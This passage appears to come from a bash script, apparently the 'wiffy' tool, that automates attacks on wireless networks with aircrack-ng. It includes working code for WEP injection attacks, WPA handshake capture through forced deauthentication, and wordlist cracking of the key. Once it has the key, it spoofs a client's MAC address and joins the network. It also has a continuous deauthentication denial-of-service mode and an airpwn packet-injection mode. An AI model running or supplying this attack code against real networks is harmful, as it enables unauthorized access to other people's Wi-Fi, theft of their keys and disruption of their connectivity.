      command=$(cat "/tmp/wiffy-01.csv" | grep $bssid | awk -F "," '{print $11}' | sed 's/ [ ]*//')
      if [ "$command" -lt "10" ] ; then
         display error "Attack (ARPReplay): Failed" 1>&2
         command=$(ps aux | grep "aireplay-ng" | awk '!/grep/ && !/awk/ {print $2}' | while read line; do echo -n "$line " ; done | awk '{print}')
         if [ -n "$command" ] ; then action "Killing programs" "kill $command" ; fi # Stopping last attack

         display action "Attack (Fragment): $client"
         action "Fragment" "aireplay-ng --fragment -b $bssid -h $client -m 100 -F $monitorInterface | tee /tmp/wiffy.tmp" "true" "0|195|5"
         if grep -q "Failure: the access point does not properly discard frames with an" "/tmp/wiffy.tmp" ; then display error "Attack (Fragment): Failed (1)" 1>&2 ;
         elif grep -q "Failure: got several deauthentication packets from the AP - try running" "/tmp/wiffy.tmp" ; then display error "Attack (Fragment): Failed (2)" 1>&2 ;
         elif grep -q "Saving keystream in" "/tmp/wiffy.tmp" ; then
            if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "Attack (Fragment): Success!" ; fi
            action "Fragment" "packetforge-ng -0 -a $bssid -h $client -k 192.168.1.100 -l 192.168.1.1 -y fragment-*.xor -w /tmp/wiffy.arp" "true" "0|195|5"
            action "Fragment" "aireplay-ng --interactive -r /tmp/wiffy.arp -f $monitorInterface" "true" "0|195|5" & # Don't wait, do the next command
            if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Waiting for IV's increase" ; fi
            sleep 10
         fi
      fi

      command=$(cat "/tmp/wiffy-01.csv" | grep $bssid | awk -F "," '{print $11}' | sed 's/ [ ]*//')
      if [ "$command" -lt "10" ] ; then
         display error "Attack (Fragment): Failed" 1>&2
         command=$(ps aux | grep "aireplay-ng" | awk '!/grep/ && !/awk/ {print $2}' | while read line; do echo -n "$line " ; done | awk '{print}')
         if [ -n "$command" ] ; then action "Killing programs" "kill $command" ; fi # Stopping last attack

         display action "Attack (ChopChop): $client"
         action "ChopChop" "aireplay-ng --chopchop -b $bssid -h $client -m 100 -F $monitorInterface | tee /tmp/wiffy.tmp" "true" "0|195|5"
         if grep -q "Failure: the access point does not properly discard frames with an" "/tmp/wiffy.tmp" ; then display error "Attack (ChopChop): Failed (1)" 1>&2 ;
         elif grep -q "Failure: got several deauthentication packets from the AP - try running" "/tmp/wiffy.tmp" ; then display error "Attack (ChopChop): Failed (2)" 1>&2 ;
         elif grep -q "Saving keystream in" "/tmp/wiffy.tmp" ; then
            if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "Attack (ChopChop): Success!" ; fi
            action "ChopChop" "packetforge-ng -0 -a $bssid -h $client -k 192.168.1.100 -l 192.168.1.1 -y fragment-*.xor -w /tmp/wiffy.arp" "true" "0|195|5"
            action "ChopChop" "aireplay-ng --interactive -r /tmp/wiffy.arp -f $monitorInterface" "true" "0|195|5" & # Don't wait, do the next command
            if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Waiting for IV's increase" ; fi
            sleep 10
         fi
      fi

      command=$(cat "/tmp/wiffy-01.csv" | grep $bssid | awk -F "," '{print $11}' | sed 's/ [ ]*//')
      if [ "$command" -lt "10" ] ; then display error "Attack (ChopChop): Failed" 1>&2
         display action "Attack (ChopChop): $client"
         command=$(ps aux | grep "aireplay-ng" | awk '!/grep/ && !/awk/ {print $2}' | while read line; do echo -n "$line " ; done | awk '{print}')
         if [ -n "$command" ] ; then action "Killing programs" "kill $command" ; fi # Stopping last attack

         display action "Attack (Interactive): $client"
         action "Interactive" "aireplay-ng --interactive -b $bssid -c FF:FF:FF:FF:FF:FF -h $client -T 1 -p 0841 -F $monitorInterface" "true" "0|195|5"
      fi

      command=$(cat "/tmp/wiffy-01.csv" | grep $bssid | awk -F "," '{print $11}' | sed 's/ [ ]*//')
      if [ "$command" -lt "10" ] ; then display error "Attack (Interactive): Failed" 1>&2 ; fi
   #----------------------------------------------------------------------------------------------#
   elif [ "$encryption" == "WPA" ] ; then
      display action "Capturing: Handshake"
      loop="0" # 0 = first, 1 = client, 2 = everyone
      echo "g0tmi1k" > /tmp/wiffy.tmp
      for (( ; ; )) ; do
         action "aircrack-ng" "aircrack-ng /tmp/wiffy-01.cap -w /tmp/wiffy.tmp -e \"$essid\" | tee /tmp/wiffy.handshake" "true" "0|195|5"
         command=$(cat "/tmp/wiffy.handshake" | grep "Passphrase not in dictionary") #Got no data packets from client network & No valid WPA handshakes found & KEY FOUND (only if its g0tmi1k)
         if [ "$command" ] ; then break; fi
         sleep 2
         if [ "$loop" != "1" ] ; then
            if [ "$loop" != "0" ] ; then findClient $encryption ; fi # Don't do this on first loop!
            sleep 2
            if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Attack (DeAuth): $client" ; fi
            action "DeAuth" "aireplay-ng --deauth 5 -a $bssid -c $client $monitorInterface" "true" "0|195|5"
            loop="1"
         else
            if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Attack (DeAuth): *everyone*" ; fi
            action "DeAuth" "aireplay-ng --deauth 5 -a $bssid $monitorInterface" "true" "0|195|5"
            loop="2"
         fi
         sleep 3
      done
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "Captured: Handshake" ; fi
      action "Killing programs" "killall xterm && sleep 1"
   fi

   #----------------------------------------------------------------------------------------------#
   if [ "$benchmark" == "true" ] && [ "$encryption" == "WPA" ] && [ -e "$wordlist" ] ; then
      display action "Benchmarking"
      wordlistLines=$(wc -l < "$wordlist")
      action "Benchmarking" "aircrack-ng /tmp/wiffy-01.cap -w $wordlist -e \"$essid\" | tee /tmp/wiffy.tmp & sleep 5 && killall xterm"
      ks=$(cat "/tmp/wiffy.tmp" | grep "keys tested" | tail -1 | awk -F " " '{print $5}' | sed 's/.\(.*\)/\1/')
      rm -f "/tmp/wiffy.tmp"

      mins=$(awk 'BEGIN {print '$wordlistLines' / ( '$ks' * 60 ) }' | awk -F\. '{if(($2/10^length($2)) >= .5) printf("%d\n",$1+1) ; else printf("%d\n",$1)}')
      hours=$(awk 'BEGIN {print '$wordlistLines' / ( '$ks' * 3600 ) }' | awk -F\. '{if(($2/10^length($2)) >= .5) printf("%d\n",$1+1) ; else printf("%d\n",$1)}')

      command=$(date --date="$mins min")
      display info "Benchmark: (ETA): $command ~ $mins minutes ($hours hours) to try $wordlistLines words"
   fi

   #----------------------------------------------------------------------------------------------#
   if [ "$keepCAP" == "true" ] ; then
      pathCAP="$outputCAP/wiffy-$essid.cap"
      display action "Moving handshake: $pathCAP"
   else
      pathCAP="/tmp/wiffy-$essid.cap"
   fi
   action "Moving handshake" "mv -f /tmp/wiffy-01.cap $pathCAP"

   #----------------------------------------------------------------------------------------------#
   if [ "$encryption" == "WEP" ] || ( [ "$encryption" == "WPA" ] && [ -e "$wordlist" ] ) ; then
      display action "Starting: aircrack-ng"
      if [ "$encryption" == "WEP" ] ; then action "aircrack-ng" "aircrack-ng $pathCAP -e \"$essid\" -l /tmp/wiffy.keys" "false" "0|285|30" ; fi
      if [ "$encryption" == "WPA" ] ; then action "aircrack-ng" "aircrack-ng $pathCAP -e \"$essid\" -l /tmp/wiffy.keys -w $wordlist" "false" "0|0|20" ; fi
   fi
   action "Closing programs" "killall xterm && airmon-ng stop $monitorInterface && sleep 2" # Sleep = Make sure aircrack-ng has saved file.

   #----------------------------------------------------------------------------------------------#
   if [ -e "/tmp/wiffy.keys" ] ; then
      key=$(cat "/tmp/wiffy.keys")
      display info "WiFi key: $key"
      echo -e "---------------------------------------\n      Date: $(date)\n     ESSID: $essid\n     BSSID: $bssid\nEncryption: $encryption\n       Key: $key\n    Client: $client" >> "wiffy.keys"
      #----------------------------------------------------------------------------------------------#
      if [ "$extras" == "true" ] ; then
         if [ "$client" != "$mac" ] ; then
            if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Attack (Spoofing): $client ('Helps' with MAC filtering) " ; fi
            action "Spoofing MAC" "ifconfig $interface down && macchanger -m $client $interface && ifconfig $interface up"
         fi
         display action "Joining: $essid"
         action "Starting services" "/etc/init.d/wicd start ; service network-manager start" # Backtrack & Ubuntu
         if [ "$encryption" == "WEP" ] ; then
            action "i[f/w]config" "ifconfig $interface down && iwconfig $interface essid $essid key $key && ifconfig $interface up"
         elif [ "$encryption" == "WPA" ] ; then
            action "WPA" "wpa_passphrase $essid '$key' > /tmp/wiffy.tmp && wpa_supplicant -B -i$interface -c/tmp/wiffy.tmp -Dwext"
            cp -f "/tmp/wiffy.tmp" "wpa.conf"
         fi
         sleep 5
         action "dhclient" "dhclient $interface"
         if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then
            ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
            display info "IP: $ourIP"
            #gateway=$(route -n | grep $interface | awk '/^0.0.0.0/ {getline; print $2}')
            #display info "Gateway: $gateway"
         fi
      fi
   elif [ "$encryption" == "WPA" ] ; then
      if [ -e "$wordlist" ] ; then display error "WiFi key isn't in the wordlist" 1>&2 ; fi
      if [ "$keepCAP" == "false" ] ; then
         display action "Moving handshake: $outputCAP/wiffy-$essid.cap"
         action "Moving capture" "mv -f $pathCAP $outputCAP/wiffy-$essid.cap"
      fi
   elif [ "$encryption" == "WEP" ] ; then
      display error "Couldn't inject" 1>&2
   elif [ "$encryption" != "N/A" ] ; then
      display error "Something went wrong )=" 1>&2
   fi
#----------------------------------------------------------------------------------------------#
elif [ "$mode" == "dos" ] ; then
   display action "Attack (DOS): $essid"
   command="aireplay-ng --deauth 0 -e \"$essid\" -a $bssid"
   if [ "$client" != "clientless" ] && [ -e "$client" ]; then command="$command -c $client" ; fi
   command="$command $monitorInterface"
   action "aireplay-ng (DeAuth)" "$command" "true" "0|0|13" &

   #----------------------------------------------------------------------------------------------#
   display info "Attacking! ...press CTRL+C to stop"
   if [ "$diagnostics" == "true" ] ; then echo "-Ready!----------------------------------" >> $logFile ; fi
   if [ "$diagnostics" == "true" ] ; then echo -e "Ready @ $(date)" >> $logFile ; fi
   for (( ; ; )) ; do
      sleep 5
   done
#----------------------------------------------------------------------------------------------#
elif [ "$mode" == "inject" ] ; then
   display action "Attack (Inject): Open/WEP networks"

   action "AirPWN" "cd /pentest/wireless/airpwn-1.4/ && airpwn -i $monitorInterface -d $wifiDriver -c conf/greet_html -vvvv" "true" "0|0|40" &

   #----------------------------------------------------------------------------------------------#
   display info "Attacking! ...press CTRL+C to stop"
   if [ "$diagnostics" == "true" ] ; then
      echo "-Ready!----------------------------------" >> $logFile
      echo -e "Ready @ $(date)" >> $logFile
   fi
   for (( ; ; )) ; do
      sleep 5
   done
fi

#----------------------------------------------------------------------------------------------#
if [ "$diagnostics" == "true" ] ; then echo "-Done!---------------------------------------------------------------------------------------" >> $logFile ; fi
cleanup clean


#---Ideas--------------------------------------------------------------------------------------#
# WPA - brute / hash
# WPA - use pre hash / use pre capture
# WPA - use folder for wordlist
#----------------------------------------------------------------------------------------------#
   #echo $wordlist > $wordlist
   #airolib-ng /tmp/wiffy-$essid.hash --import essid /tmp/wiffy.tmp
   #echo $wordlist > /tmp/wiffy.tmp
   #airolib-ng /tmp/wiffy-$essid.hash --import passwd /tmp/wiffy.tmp
   #airolib-ng /tmp/wiffy-$essid.hash --stats
   #airolib-ng /tmp/wiffy-$essid.hash --clean all
   #airolib-ng /tmp/wiffy-$essid.hash --batch
   #airolib-ng /tmp/wiffy-$essid.hash --verify all
#----------------------------------------------------------------------------------------------#
   #-p [/path/to/file]     ---  Path to pre-captured cap file e.g. $preCap
#----------------------------------------------------------------------------------------------#
#   action "aireplay-ng (Inject)" "airtun-ng -a $bssid $monitorInterface" &
#   action "aireplay-ng (Inject)" "ifconfig at0 192.168.1.83 netmask 255.255.255.0 up" &
   #airdecap-ng -w [wep $key] -p [wpa $key] -k [wpa $key]
#----------------------------------------------------------------------------------------------#
   #aireplay-ng --interactive -b $bssid -d $client -t 1 -F $monitorInterface
   #aireplay-ng --interactive -b $bssid -c FF:FF:FF:FF:FF:FF -t 1 -F $monitorInterface
   #aireplay-ng --interactive -b $bssid -c FF:FF:FF:FF:FF:FF -h $client -T 1 -p 0841 -F $monitorInterface
#----------------------------------------------------------------------------------------------#
